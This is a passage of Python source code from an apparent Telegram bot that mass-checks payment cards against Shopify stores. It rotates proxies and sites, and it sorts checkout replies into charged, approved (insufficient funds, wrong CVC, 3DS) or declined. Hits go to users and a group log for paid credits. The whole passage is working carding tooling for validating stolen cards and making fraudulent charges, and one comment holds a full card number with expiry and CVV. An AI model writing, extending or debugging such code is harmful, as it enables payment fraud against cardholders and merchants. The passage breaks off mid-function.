        # When "message to edit not found" fires (user deleted it, chat
        # was cleared, etc.) we mark the session. On the next call we
        # send a FRESH message instead of editing, so the user still
        # sees live progress. This also helps when the bot's edits
        # silently fail for any reason — a new message is more reliable.
        if session.get('_progress_msg_dead') and not is_finished and not is_stopped:
            try:
                new_msg = await bot.send_message(
                    chat_id=session['chat_id'],
                    text=text,
                    parse_mode="HTML",
                    reply_markup=reply_markup,
                )
                session['msg_id'] = new_msg.message_id
                session['_progress_msg_dead'] = False
                session['last_text'] = text
                session['last_update_time'] = current_time
                session['last_update_checked'] = checked
                session['last_update_charged'] = charged
                session['last_update_approved'] = approved
                logging.info(
                    f"[MSH] sent new progress message (replaced dead one) "
                    f"for session {session_id}"
                )
            except Exception as e:
                logging.error(f"[MSH] Failed to resend progress message: {e}")


def _build_progress_caption(session: dict, session_id: str) -> str:
    """
    Builds the premium-looking progress message used by both the initial
    message and every live update during the mass check.
    """
    elapsed = time.time() - session['start_time']
    minutes = int(elapsed // 60)
    seconds = int(elapsed % 60)
    elapsed_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"

    status = session['status']
    if status == "CHECKING":
        status_emoji = '<tg-emoji emoji-id="5445023138297447592">🔄</tg-emoji>'
        status_text = f"<i>CHECKING</i>"
    elif status == "STOPPED":
        status_emoji = "🛑"
        status_text = f"<b>STOPPED</b>"
    else:  # FINISHED
        status_emoji = "<tg-emoji emoji-id='5310296284874159738'>✅</tg-emoji>"
        status_text = f"<b>FINISHED</b>"

    checked = session['checked']
    total = session['total']
    approved = session['approved']
    charged = session['charged']
    dead = session['dead']
    errors = session['errors']

    # ━━━ Visual progress bar (14 chars wide) ━━━
    bar_width = 14
    if total > 0:
        filled = max(0, min(bar_width, int(round(bar_width * checked / total))))
    else:
        filled = 0
    empty = bar_width - filled
    progress_bar = "█" * filled + "░" * empty
    pct = int(round(100 * checked / total)) if total > 0 else 0

    proxy_line = ""
    proxy_manager = session.get('proxy_manager')
    if proxy_manager:
        stats = proxy_manager.get_stats()
        proxy_line = ""

    user_obj = session.get('user_obj')
    user_link = build_user_link(user_obj) if user_obj else "Unknown"

    # ━━━ Notify-mode line (so user knows why Approved DMs aren't dropping) ━━━
    notify_mode = session.get('notify_mode', 'all_approved')
    if notify_mode == 'charged_only':
        mode_line = (
            f'<tg-emoji emoji-id="{CUSTOM_CHARGED_EMOJI_ID}">💎</tg-emoji> '
            f'<b>Mode ➛</b> <b>Charged Only</b> '
            f"<i>(Approved counted in Live {approved}, not DM'd)</i>\n"
        )
    else:
        mode_line = (
            f'<tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">✅</tg-emoji> '
            f'<b>Mode ➛</b> <b>Approved + Charged</b> '
            f"<i>(live drops enabled)</i>\n"
        )

    return (
        # ━━━ Status ━━━
        f'<tg-emoji emoji-id="4904882772637648609">🎯</tg-emoji> <b>Status ➛</b> {status_text} {status_emoji}\n'
        f"━━━━━━━━━━━━━━━━\n"
        # ━━━ Progress bar ━━━
        f"<code>[{progress_bar}]</code> <b>{pct}%</b>\n"
        f"<b>Checked ➛</b> <code>{checked}/{total}</code>\n"
        # ━━━ Counts ━━━
        f'<tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">✅</tg-emoji> '
        f'<b>Approved ➛</b> <b>{approved}</b>  '
        f'<tg-emoji emoji-id="{CUSTOM_CHARGED_EMOJI_ID}">💎</tg-emoji> '
        f'<b>Charged ➛</b> <b>{charged}</b>  '
        f'<tg-emoji emoji-id="{CUSTOM_DECLINED_EMOJI_ID}">❌</tg-emoji> '
        f'<b>Decline ➛</b> <b>{dead}</b>  '
        f'<tg-emoji emoji-id="{EMOJI_RED_TICK}">⚠️</tg-emoji> '
        f'<b>Errors ➛</b> <b>{errors}</b>\n'
        f'<tg-emoji emoji-id="{EMOJI_LIGHTNING}">⏱</tg-emoji> '
        f'<b>Time ➛</b> <b>{elapsed_str}</b>\n'
        f'<tg-emoji emoji-id="5433641741251011862">👤</tg-emoji> '
        f'<b>User ➛</b> {user_link}'
        f"\n━━━━━━━━━━━━━━━━\n"
        # ━━━ Footer ━━━
        f'<tg-emoji emoji-id="5361979846845014099">👑</tg-emoji> <b>Owner ➛</b> '
        f'<a href="https://t.me/Im_in_so_love"><b>Rukia</b></a>'
    )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SINGLE CARD PROCESSING - WITH SMART RETRY LOGIC
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, user_obj, plan_name, api_idx: int | None = None):
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return

    if is_session_stopped(session_id):
        return

    # Whether the check was started from a group chat
    is_group = session.get('is_group', False)

    # System-level guard — these are infrastructure/session-level issues,
    # NOT per-card errors. We log them but do NOT increment
    # session['errors'] (which is shown in stats alongside dead/charged).
    # Doing so previously caused the "All 📁" file to disagree with the
    # live stats counter (stats +1 but no card added to error_cards →
    # silently invisible in the file report).
    sites_list = session.get('sites_list') or get_sites()
    if not sites_list:
        logging.error(f"[MSH] sites.txt is empty — no sites available for session {session_id}")
        return

    proxy_manager = session.get('proxy_manager')
    if not proxy_manager:
        logging.error(f"[MSH] No proxy manager found for session {session_id}")
        return

    # ══════════════════════════════════════════
    # STATUS CLASSIFICATION RULES
    # ══════════════════════════════════════════

    result_status = "ERROR"
    response_msg = "Unknown Error"
    api_price = "0.00"
    proxy_status_formatted = "Unknown <tg-emoji emoji-id='5397890704062038337'>🔴</tg-emoji>"
    bin_data = {}
    used_proxy = None

    # Retry budgets. Both at 7 (admin request) so "Cart failed with status
    # 429", "Unknown Error", and other transient/site errors all rotate to
    # a fresh site+proxy up to 7 times before final classification.
    MAX_RETRIES = 7
    TRANSIENT_RETRY_MAX = 7
    attempt = 0
    used_sites: set = set()
    transient_retries: int = 0

    parts = cc_formatted.split('|')
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 2: yy = "20" + yy

    if is_session_stopped(session_id):
        return

    try:
        bin_data = await get_bin_info(cc_num[:6])
    except:
        bin_data = {}

    if is_session_stopped(session_id):
        return

    while attempt < MAX_RETRIES:
        if is_session_stopped(session_id):
            return

        attempt += 1

        proxy_result = proxy_manager.get_next_proxy()

        # System-level guard — proxy exhaustion is a session-wide issue.
        # BUGFIX: `get_next_proxy()` returns a 2-tuple `(proxy, bool)` even
        # on failure — `(None, False)` — and a non-empty tuple is always
        # truthy, so the old `if not proxy_result:` guard NEVER triggered.
        # Cards then proceeded with `proxy=None`, silently called the API
        # with no proxy, and either failed every retry or hung. With all
        # proxies in cooldown this caused sessions to freeze at 0/checked
        # forever (the "User 1 stuck at 0/92" symptom). Now we check the
        # first element explicitly and mark the card ERROR so the session
        # drains (user sees 100% errors → knows proxies are dead) instead
        # of hanging invisibly.
        if proxy_result is None or proxy_result[0] is None:
            logging.error(f"[MSH] No proxies available for session {session_id}")
            result_status = "ERROR"
            response_msg = "No Proxies Available"
            proxy_status_formatted = "Dead <tg-emoji emoji-id='5397890704062038337'>🔴</tg-emoji>"
            break

        proxy, is_rotated = proxy_result
        used_proxy = proxy

        if is_session_stopped(session_id):
            return

        site = random.choice(sites_list)

        if is_session_stopped(session_id):
            return

        try:
            success, message, url, gateway, price, currency, proxy_status_raw, http_status = await process_card_api(
                cc=cc, mes=mm, ano=yy, cvv=cvv, site=site, proxy=proxy, api_idx=api_idx
            )

            if is_session_stopped(session_id):
                return

            if "live" in str(proxy_status_raw).lower():
                proxy_status_formatted = "Live <tg-emoji emoji-id='5350572310627632617'>🟢</tg-emoji>"
            else:
                proxy_status_formatted = "Dead <tg-emoji emoji-id='5397890704062038337'>🔴</tg-emoji>"

            api_price = price

            proxy_manager.report_result(proxy, message, http_status)

            # ── AUTO-REMOVE DEAD SITES ──────────────────────────────
            # If the API response indicates the SITE itself is broken
            # (not a card decision), remove that site from this
            # session's cache IMMEDIATELY so the next retry on this
            # card picks a different site, AND schedule a background
            # file rewrite so future /msh sessions skip it too.
            if message:
                msg_lc = str(message).lower()
                if any(pat in msg_lc for pat in _AUTO_REMOVE_SITE_PATTERNS):
                    sites_in_session = session.get('sites_list')
                    if isinstance(sites_in_session, list) and site in sites_in_session:
                        session['sites_list'] = [
                            s for s in sites_in_session if s != site
                        ]
                        logging.warning(
                            f"[MSH] Dead site detected: {site} "
                            f"(response: {str(message)[:80]}) — "
                            f"removed from session cache "
                            f"({len(session['sites_list'])} left)"
                        )
                    asyncio.create_task(_remove_dead_site_from_file(site))

            message_upper = message.upper()
            message_lower = message.lower()
            # Normalise underscores → spaces so new API ("Card Declined")
            # matches against keywords that use underscores ("CARD_DECLINED")
            message_normalized = message_upper.replace("_", " ")

            # ── 0. NON-RETRYABLE PRODUCT / QUANTITY RESTRICTIONS ────
            # These are REAL responses from the Shopify site (cart-level
            # rules) — NOT proxy errors, NOT site errors. Retrying with a
            # different site might find a working one, but retrying the
            # SAME site is pointless. Treat as DEAD so the card doesn't
            # waste retry budget. Examples:
            #   "You have to buy at least 3 of these items (Green Color)"
            #   "Minimum quantity of 2 required"
            #   "Item is sold out"
            NON_RETRYABLE_PRODUCT_PATTERNS = (
                'buy at least',
                'minimum quantity',
                'quantity of',
                'must purchase',
                'sold out',
                'out of stock',
                'not available for purchase',
            )
            if any(pat in message_lower for pat in NON_RETRYABLE_PRODUCT_PATTERNS):
                result_status = "DEAD"
                response_msg = message
                break

            # ══════════════════════════════════════════════════════
            # STATUS CLASSIFICATION — Shopify1-style pattern
            # ══════════════════════════════════════════════════════

            # ── 1. CHARGED ───────────────────────────────────────
            # "Charged USD X.XX" (new API) / "ORDER_PAID" / "THANK YOU" / etc.
            if (
                "CHARGED" in message_upper
                or "ORDER_PAID" in message_upper
                or "ORDER_PLACED" in message_upper
                or "ORDER PLACED" in message_normalized
                or "PAYMENT_SUCCESS" in message_upper
                or "PAYMENT SUCCESS" in message_normalized
                or "PAYMENT_CAPTURED" in message_upper
                or "PAYMENT CAPTURED" in message_normalized
                or "TRANSACTION SUCCESSFUL" in message_upper
                or "SUCCESSFULLY PAID" in message_upper
                or "INVOICE PAID" in message_normalized
                or "PAYMENT_RECEIVED" in message_upper
                or "THANK YOU" in message_upper
            ):
                result_status = "CHARGED"
                response_msg = message
                break

            # ── 2. APPROVED ──────────────────────────────────────
            # "Approved USD X.XX" (new API) / "INSUFFICIENT_FUNDS" /
            # "INCORRECT_CVC" / "INVALID_CVC" (old API) / "3DS" variants /
            # "OTP_REQUIRED" — Shopify 3DS-OTP challenge response means card
            # is VALID but merchant needs one-time-password verification.
            # Live/approve count, not error or dead.
            #
            # BUGFIX: the old checks used `"INCORRECT_CVC" in message_normalized`
            # but message_normalized has underscores REPLACED with spaces, so
            # "INCORRECT_CVC" (underscore) never matched "INCORRECT CVC" (space).
            # This caused INCORRECT_CVC / INVALID_CVC / 3D_AUTHENTICATION /
            # 3DS_REQUIRED to silently fall through to ERROR instead of APPROVED.
            # Now we check BOTH forms: underscore (message_upper) + space
            # (message_normalized).
            elif (
                "APPROVED" in message_upper
                or "INSUFFICIENT_FUNDS" in message_upper
                or "INSUFFICIENT" in message_lower
                or "INCORRECT_CVC" in message_upper
                or "INCORRECT CVC" in message_normalized
                or "INVALID_CVC" in message_upper
                or "INVALID CVC" in message_normalized
                or "3D_AUTHENTICATION" in message_upper
                or "3D AUTHENTICATION" in message_normalized
                or "3DS_REQUIRED" in message_upper
                or "3DS REQUIRED" in message_normalized
                or "3DS" in message_upper
                or "OTP_REQUIRED" in message_upper
                or "OTP REQUIRED" in message_normalized
            ):
                result_status = "APPROVED"
                response_msg = message
                break

            # ── 3. EXPLICIT DECLINED keywords ────────────────────
            # Catches things like "CARD_DECLINED", "GENERIC ERROR",
            # "BRAND IS NOT SUPPORTED", etc. Both sides are normalised
            # the same way (underscores -> spaces) so "GENERIC_ERROR"
            # and "GENERIC ERROR" both match the "GENERIC ERROR"
            # pattern in DECLINED_RESPONSES. User-reported: previously
            # this silently failed on the underscore form and the card
            # was counted as ERROR instead of DEAD -- a real Shopify
            # decline showing up as a bot error.
            elif any(
                d.upper().replace("_", " ") in message_normalized
                for d in DECLINED_RESPONSES
            ):
                result_status = "DEAD"
                response_msg = message
                break

            # ── 4. RETRYABLE SITE / CHECKOUT ERROR ────────────────
            # These messages contain "error" but they're actually
            # site/checkout failures — NOT a proxy problem. We must
            # retry on a DIFFERENT site before giving up. Catches
            # things like:
            #   "An error occurred during the checkout process"
            #   "Error processing payment"
            #   "Internal checkout error"
            #   "Store checkout failed"
            #
            # IMPORTANT: this branch runs BEFORE the generic
            # `"ERROR" in message_upper` branch below — otherwise the
            # generic check would short-circuit these into ERROR
            # status with zero retries, which is what happened to
            # the card 4240090003774430|06|29|553.
            elif any(retry_err.lower() in message_lower for retry_err in RETRY_ERRORS):
                if attempt < MAX_RETRIES:
                    logging.info(
                        f"[MSH] Site/Checkout error ({message[:60]}...) - "
                        f"retrying with different site... ({attempt}/{MAX_RETRIES})"
                    )
                    await asyncio.sleep(0.01 + random.uniform(0, 0.02))
                    continue
                else:
                    result_status = "ERROR"
                    response_msg = f"Site Error (retried {MAX_RETRIES}x): {message}"
                    break

            # ── 4b. TRANSIENT "ERROR" / "Site Error! Status: 503" ───
            # User-reported: when the API returns just "ERROR", "Unknown
            # Error", "error: ...", or "<b>Site Error! Status: 503</b>",
            # the failure is usually transient (site overloaded, proxy
            # hiccup, backend bug mid-response). Retry on a DIFFERENT
            # site up to TRANSIENT_RETRY_MAX (8) times before giving up.
            # Once 8 retries are exhausted, fall through to ERROR status
            # so the bot reports it normally instead of looping forever.
            stripped_upper = message_upper.strip()
            is_transient = (
                stripped_upper == "ERROR"
                or stripped_upper == "UNKNOWN ERROR"
                or stripped_upper.startswith("ERROR:")
                or stripped_upper.startswith("ERROR :")
                or "site error! status: 503" in message_lower
            )
            if is_transient:
                transient_retries += 1
                if transient_retries <= TRANSIENT_RETRY_MAX:
                    logging.info(
                        f"[MSH] Transient error ({message[:60]}) - "
                        f"retrying on different site ({transient_retries}/{TRANSIENT_RETRY_MAX})..."
                    )
                    await asyncio.sleep(0.01 + random.uniform(0, 0.02))
                    continue
                else:
                    result_status = "ERROR"
                    response_msg = f"Site Error (retried {TRANSIENT_RETRY_MAX}x): {message}"
                    break

            # ── 5. GENERIC ERROR / proxy / timeout / site errors ─
            # API returned an error-like response — not a real card result
            elif (
                "ERROR" in message_upper
                or "TIMEOUT" in message_upper
                or "error" in message_lower
            ):
                result_status = "ERROR"
                response_msg = message
                break

            # ── 6. Proxy / retry / unknown ───────────────────────
            # Handle proxy errors and any other retryable failures
            # not caught by RETRY_ERRORS (rare edge cases).
            else:
                is_proxy_error = proxy_manager.is_real_proxy_error(message, http_status)

                if is_proxy_error:
                    if attempt == MAX_RETRIES:
                        result_status = "ERROR"
                        response_msg = f"Proxy Error: {message}"
                        break
                    else:
                        # Small jittered backoff so concurrent workers don't
                        # all wake at the same instant after a proxy failure.
                        await asyncio.sleep(0.01 + random.uniform(0, 0.03))
                        continue

                # Fallback for anything else: API success flag determines
                # final status. (RETRY_ERRORS matches are now handled in
                # step 4 above — no need to check again here.)
                else:
                    if success is False:
                        result_status = "DEAD"
                    else:
                        result_status = "ERROR"
                    response_msg = message
                    break

        except asyncio.CancelledError:
            raise
        except ProxyDeadError as e:
            if is_session_stopped(session_id):
                return
            # Proxy itself is unreachable (ClientProxyConnectionError /
            # semaphore timeout / etc). Give it a LONG cooldown so it
            # doesnt get re-tested every card, and immediately retry
            # with a fresh proxy. force_dead_cooldown bypasses the
            # escalating 15s->30s ladder and goes straight to several
            # minutes so we dont burn 4x the API timeout per card
            # against the same dead proxy across 2227 cards.
            proxy_manager.force_dead_cooldown(proxy, str(e), cooldown_seconds=60)
            await asyncio.sleep(0.01 + random.uniform(0, 0.02))
            continue
        except Exception as e:
            if is_session_stopped(session_id):
                return
            proxy_manager.report_result(proxy, str(e), None)

            if attempt == MAX_RETRIES:
                result_status = "ERROR"
                response_msg = "Connection Error"
                proxy_status_formatted = "Error <tg-emoji emoji-id='5397890704062038337'>🔴</tg-emoji>"
                break
            else:
                # Short jittered backoff — previously a fixed 0.5s which
                # compounded badly across many concurrent failed workers.
                await asyncio.sleep(0.01 + random.uniform(0, 0.03))
                continue

    if is_session_stopped(session_id):
        return

    # ━━━ FINAL RESPONSE REMAP ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # Replace raw Shopify GraphQL merchant codes with bot-friendly display
    # strings AFTER all retries have been exhausted. These are
    # transient/merchant-state errors (cart delivery, sale mismatch etc.)
    # that the retry loops above can't always resolve — they're not real
    # card declines but the raw text is ugly in the user's txt report.
    # Keep the classification (DEAD/ERROR) the same; only the visible
    # response message is replaced.
    #
    # SUBSTRING match (not exact): raw messages often contain trailing
    # noise like graphQL step numbers / proxy warnings / version strings,
    # and we display whatever NOT in the raw truncated snippet too.
    # First-match-wins so put more specific entries before generic ones.
    _RESPONSE_REMAP = (
        ("DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",  "Merchant Cart Conflict"),
        ("DELIVERY DELIVERY LINE DETAIL CHANGED",  "Merchant Cart Conflict"),
        # The bot-side adapter occasionally returns this when its own JSON
        # parser can't read the merchant submit response. The bot retried
        # it via RETRY_ERRORS first; on the rare case it persists, show a
        # friendly generic-transient line instead of the noisy raw snippet.
        ("Invalid JSON in submit response: GraphQL Error", "Transient API Submit Error"),
        ("Invalid JSON in submit response",                "Transient API Submit Error"),
    )
    for raw, friendly in _RESPONSE_REMAP:
        if raw in (response_msg or "") or response_msg == raw:
            logging.debug(
                f"[MSH] Remapping raw response containing {raw!r} → {friendly!r} for {cc_formatted[:8]}..."
            )
            response_msg = friendly
            break

    logging.debug(f"[MSH] {cc_formatted} | {result_status} | {response_msg} | Proxy: {mask_proxy(used_proxy) if used_proxy else 'None'}")

    session['checked'] += 1

    card_result_data = {
        'card': cc_formatted,
        'response': response_msg,
        'bin_info': bin_data,
        'price': api_price,
        'gateway': 'Shopify',
        'timestamp': datetime.now().isoformat(),
        'proxy_used': mask_proxy(used_proxy) if used_proxy else 'N/A'
    }

    if is_session_stopped(session_id):
        return

    # ── User status flags resolved ONCE at session start (see
    # process_mass_check_background). Avoids per-card sync MongoDB
    # calls that previously blocked the event loop on every card.
    is_adm = session.get('_is_admin_cached', is_admin(user_id))
    is_prem = session.get('_is_premium_cached', False)
    is_unl = session.get('_is_unlimited_cached', False)
    should_charge_credits = (not is_adm) and (not is_prem) and (not is_unl)

    def _schedule_db(coro_factory):
        """
        Fire-and-forget a DB write. We:
          1. Wrap it in _run_bg_db so exceptions are logged.
          2. Keep a strong ref in session['_db_tasks'] so the task is not
             garbage-collected mid-flight (the event loop also holds a
             weak ref, so this is belt-and-suspenders).
        The user-visible DM is NOT blocked on this — it runs in background.
        """
        task = asyncio.create_task(_run_bg_db(coro_factory))
        session.setdefault('_db_tasks', []).append(task)
        return task

    if result_status == "CHARGED":
        session['charged'] += 1
        session['charged_cards'].append(card_result_data)

        # DB writes run in background — DON'T await them here, otherwise
        # slow MongoDB latency on Railway delays the user-visible DM.
        _schedule_db(lambda: asyncio.to_thread(update_user_stats, user_id, True))
        _schedule_db(lambda: asyncio.to_thread(log_hit_to_mshh, user_id, user_obj.username, user_obj.first_name))
        if should_charge_credits:
            _schedule_db(lambda: asyncio.to_thread(deduct_credits_atomic, user_id, 2))

        if is_session_stopped(session_id):
            return

        # Send DM + group log FIRST so user sees charge instantly.
        await asyncio.gather(
            send_hit_log_to_group(bot, response_msg, user_obj, plan_name, proxy_status_formatted, api_price),
            send_charged_msg_to_user(bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name),
        )

    elif result_status == "APPROVED":
        session['approved'] += 1
        session['live_cards'].append(card_result_data)

        _schedule_db(lambda: asyncio.to_thread(update_user_stats, user_id, True))
        if should_charge_credits:
            _schedule_db(lambda: asyncio.to_thread(deduct_credits_atomic, user_id, 1))

        if is_session_stopped(session_id):
            return

        # ━━━ GROUP HIT LOG FOR APPROVED ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        # Admin-requested: APPROVED hits post to the hit-log group too,
        # BUT only for response types that indicate a genuinely live card
        # (INSUFFICIENT_FUNDS, INCORRECT_CVC, INVALID_CVC). Challenge-type
        # responses (OTP_REQUIRED / 3DS / 3D_AUTHENTICATION) are NOT
        # logged to the group — admin doesn't want OTP/3DS hits in the
        # channel, only real fund/CVC signals and charges.
        response_upper_log = (response_msg or "").upper()
        response_norm_log = response_upper_log.replace("_", " ")
        _GROUP_LOG_APPROVED = (
            "INSUFFICIENT_FUNDS" in response_upper_log
            or "INSUFFICIENT" in response_upper_log
            or "INCORRECT_CVC" in response_norm_log
            or "INVALID_CVC" in response_norm_log
        )
        if _GROUP_LOG_APPROVED:
            asyncio.create_task(
                send_hit_log_to_group(
                    bot, response_msg, user_obj, plan_name,
                    proxy_status_formatted, api_price, is_approved=True,
                )
            )

        # ━━━ CHARGE-ONLY NOTIFY GATE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        # When the user picked "🔥 Charged Only" mode at the button prompt,
        # notify_mode == "charged_only". In that mode we DELIBERATELY skip
        # the approved DM so the user's chat isn't spammed by every live
        # card during the run — approved count still goes into
        # session['approved'] (visible in the Live {N} button + progress
        # bar counter) and session['live_cards'] (saved for the .txt file
        # at the end via handle_result_callback → MshResultCallback).
        notify_mode = session.get('notify_mode', 'all_approved')
        if notify_mode == "charged_only":
            logging.debug(
                f"[msh] APPROVED suppressed (charged_only) for {cc_formatted[:6]}**** "
                f"— counted in Live ({session['approved']})"
            )
            # Skip send_approved_msg_to_user below. Progress bar will pick
            # up the +1 increment via update_progress_message at the
            # bottom of this function (status is CHARGED/APPROVED gated).
        else:
            await send_approved_msg_to_user(bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name)
    elif result_status == "DEAD":
        session['dead'] += 1
        session['dead_cards'].append(card_result_data)

        _schedule_db(lambda: asyncio.to_thread(update_user_stats, user_id, False))
        if should_charge_credits:
            _schedule_db(lambda: asyncio.to_thread(deduct_credits_atomic, user_id, 1))
        # NOTE: NO update_progress_message() here. With 100 workers/user,
        # DEAD is by far the most common result (90%+ of cards) — calling
        # the update on every dead card would spam Telegram at ~16 calls/s
        # per user, instantly triggering flood control. The 1.5s background
        # updater below picks up the counter changes.
    elif result_status == "ERROR":
        session['errors'] += 1
        session['error_cards'].append(card_result_data)
        _schedule_db(lambda: asyncio.to_thread(update_user_stats, user_id, False))
        # Same rationale as DEAD above — let the background updater handle it.

    if is_session_stopped(session_id):
        return

    # Only force-update the progress message for RARE-but-important events
    # (CHARGED/APPROVED). For DEAD/ERROR — the common case — we rely on the
    # 1.5s background updater to refresh counters. Calling here unconditionally
    # was hitting Telegram at ~16 calls/s per user and triggering flood control.
    if result_status in ("CHARGED", "APPROVED"):
        await update_progress_message(bot, session_id)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.callback_query(MshResultCallback.filter())
async def handle_result_callback(callback: types.CallbackQuery, callback_data: MshResultCallback):
    try:
        session_id = callback_data.session_id
        result_type = callback_data.result_type

        session = MSH_SESSIONS.get(session_id)

        if not session:
            await callback.answer("<tg-emoji emoji-id='5350572310627632617'>⚠️</tg-emoji> Session expired", show_alert=True)
            return

        if callback.from_user.id != session.get('user_id'):
            await callback.answer("<tg-emoji emoji-id='5397890704062038337'>❌</tg-emoji> No permission", show_alert=True)
            return

        if is_buttons_locked(session_id):
            remaining = get_remaining_lock(session_id)
            await callback.answer(f"<tg-emoji emoji-id='4904882772637648609'>⏳</tg-emoji> Please wait {remaining} seconds before using buttons", show_alert=True)
            return

        count = 0
        if result_type == "charged":
            count = len(session.get('charged_cards', []))
        elif result_type == "live":
            count = len(session.get('live_cards', []))
        elif result_type == "dead":
            count = len(session.get('dead_cards', []))
        else:
            count = (
                len(session.get('charged_cards', [])) +
                len(session.get('live_cards', [])) +
                len(session.get('dead_cards', [])) +
                len(session.get('error_cards', []))
            )

        if count == 0:
            type_names = {"charged": "Charged", "live": "Live", "dead": "Dead", "all": ""}
            type_name = type_names.get(result_type, "")
            await callback.answer(f"<tg-emoji emoji-id='5397890704062038337'>❌</tg-emoji> No {type_name} cards found", show_alert=True)
            return

        await callback.answer("📦 Generating report...", show_alert=False)

        user_obj = session.get('user_obj')
        plan_name = session.get('plan_name', 'TRIAL')
        user_msg_id = session.get('user_msg_id')

        file_buffer, filename, total_count = generate_result_file(session, result_type, user_obj, plan_name)

        file_content = file_buffer.read()
        file_buffer.seek(0)

        type_emojis = {"charged": "<tg-emoji emoji-id='6183613910977876404'>💎</tg-emoji>", "live": "<tg-emoji emoji-id='5310296284874159738'>✅</tg-emoji>", "dead": "<tg-emoji emoji-id='5397890704062038337'>❌</tg-emoji>", "all": "📁"}
        type_labels = {"charged": "CHARGED", "live": "Live", "dead": "Dead", "all": "All"}

        emoji = type_emojis.get(result_type, "📁")
        label = type_labels.get(result_type, "All")

        caption = (
            f"Result Type ➛ {label} {emoji}\n"
            f"Total Cards ➛ <b>{total_count}</b>\n"
            f"Gateway ➛ Shopify Mass"
        )

        document = types.BufferedInputFile(file=file_content, filename=filename)

        try:
            await callback.bot.send_document(
                chat_id=callback.message.chat.id,
                document=document,
                caption=caption,
                parse_mode="HTML",
                reply_to_message_id=user_msg_id
            )
        except TelegramBadRequest as e:
            err_lower = str(e).lower()
            if "message to reply not found" in err_lower or "reply message not found" in err_lower:
                try:
                    document.seek(0)
                except Exception:
                    document = types.BufferedInputFile(file=file_content, filename=filename)
                await callback.message.answer_document(document=document, caption=caption, parse_mode="HTML")
            else:
                raise

    except Exception as e:
        logging.error(f"Error handling result callback: {e}", exc_info=True)
        try:
            await callback.message.answer(f"<tg-emoji emoji-id='5397890704062038337'>❌</tg-emoji> Error: <code>{str(e)[:50]}</code>", parse_mode="HTML")
        except:
            pass

@router.callback_query(MshStopCallback.filter())
async def handle_stop_callback(callback: types.CallbackQuery, callback_data: MshStopCallback):
    try:
        session_id = callback_data.session_id

        session = MSH_SESSIONS.get(session_id)

        if not session:
            await callback.answer("<tg-emoji emoji-id='5350572310627632617'>⚠️</tg-emoji> Session expired", show_alert=True)
            return

        if callback.from_user.id != session.get('user_id'):
            await callback.answer("<tg-emoji emoji-id='5397890704062038337'>❌</tg-emoji> No permission", show_alert=True)
            return

        if is_buttons_locked(session_id):
            remaining = get_remaining_lock(session_id)
            await callback.answer(f"<tg-emoji emoji-id='4904882772637648609'>⏳</tg-emoji> Please wait {remaining} seconds before using buttons", show_alert=True)
            return

        if session['status'] != "CHECKING":
            await callback.answer("ℹ️ Not running", show_alert=True)
            return

        session['status'] = "STOPPED"

        print(f"🛑 [MSH] Stop signal sent")
        logging.info(f"🛑 [MSH] Stop signal sent")

        cancelled_count = 0
        for task in session.get('tasks', []):
            if not task.done():
                task.cancel()
                cancelled_count += 1

        await callback.answer("🛑 Stopping...", show_alert=False)

        print(f"🛑 [MSH] Cancelled {cancelled_count} tasks")
        logging.info(f"🛑 [MSH] Cancelled {cancelled_count} tasks")

        proxy_manager = session.get('proxy_manager')
        if proxy_manager:
            stats = proxy_manager.get_stats()
            print(f"📊 [ProxyManager Stats] Total: {stats['total_proxies']}, Active: {stats['active']}, Failed: {stats['failed']}, Uses: {stats['total_uses']}")
            logging.info(f"📊 [ProxyManager Stats] {stats}")

        session['last_text'] = ""
        await update_progress_message(callback.bot, session_id)

    except Exception as e:
        logging.error(f"Error handling stop callback: {e}", exc_info=True)
        try:
            await callback.answer("<tg-emoji emoji-id='5397890704062038337'>❌</tg-emoji> Error stopping", show_alert=True)
        except:
            pass


@router.callback_query(MshRetryCallback.filter())
async def handle_retry_callback(callback: types.CallbackQuery, callback_data: MshRetryCallback):
    try:
        session_id = callback_data.session_id
        session = MSH_SESSIONS.get(session_id)

        if not session:
            await callback.answer("<tg-emoji emoji-id='5350572310627632617'>⚠️</tg-emoji> Session expired", show_alert=True)
            return

        if callback.from_user.id != session.get('user_id'):
            await callback.answer("<tg-emoji emoji-id='5397890704062038337'>❌</tg-emoji> No permission", show_alert=True)
            return

        if session['status'] == "CHECKING":
            await callback.answer("ℹ️ Already running", show_alert=True)
            return

        error_cards = session.get('error_cards', [])
        if not error_cards:
            await callback.answer("<tg-emoji emoji-id='5397890704062038337'>❌</tg-emoji> No error cards to retry", show_alert=True)
            return

        retry_tuples = []
        for c in error_cards:
            cc_formatted = c.get('card', '')
            parts = cc_formatted.split('|')
            if len(parts) != 4:
                continue
            cc_num = parts[0]
            retry_tuples.append((cc_formatted, cc_num))

        if not retry_tuples:
            await callback.answer("<tg-emoji emoji-id='5397890704062038337'>❌</tg-emoji> No valid error cards to retry", show_alert=True)
            return

        await callback.answer(f"🔁 Retrying {len(retry_tuples)} error cards...", show_alert=False)

        session['status'] = "CHECKING"
        session['total'] = len(retry_tuples)
        session['checked'] = 0
        session['approved'] = 0
        session['charged'] = 0
        session['dead'] = 0
        session['errors'] = 0
        session['live_cards'] = []
        session['dead_cards'] = []
        session['charged_cards'] = []
        session['error_cards'] = []
        session['tasks'] = []
        session['start_time'] = time.time()
        session['last_text'] = ""
        session['last_update_time'] = 0

        logging.info(f"🔁 [MSH] Retry session {session_id} - {len(retry_tuples)} error cards")

        asyncio.create_task(
            run_mass_checker(
                callback.bot,
